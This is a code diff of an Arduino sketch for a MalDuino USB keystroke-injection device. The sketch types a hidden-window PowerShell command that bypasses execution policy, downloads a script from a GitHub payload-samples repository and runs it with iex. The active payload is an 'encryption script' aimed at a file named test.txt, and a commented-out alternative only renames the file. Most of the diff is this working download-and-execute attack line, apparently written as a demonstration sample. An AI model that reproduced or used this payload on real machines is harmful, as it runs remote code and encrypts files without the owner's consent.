@@ -87,9 +87,14 @@ void setup(){
     delay(defaultDelay);
     typeKey(KEY_RETURN);
 
-    // run encryption script directly from github
-    delay(defaultDelay);
-    Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/single_file_enc.ps1') | iex\"");
+  // run encryption script directly from github
+  // please select what payload to run 
+  // single_file_enc.ps1 to encrypt the file test.txt 
+  // or
+  // single_file_ren.ps1 just to rename the file test.txt to test.txt.ren
+  delay(defaultDelay);
+  Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/single_file_enc.ps1') | iex\"");
+  // Keyboard.print("powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden \"(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/single_file_ren.ps1') | iex\"");
 
     delay(defaultDelay);
     typeKey(KEY_RETURN);
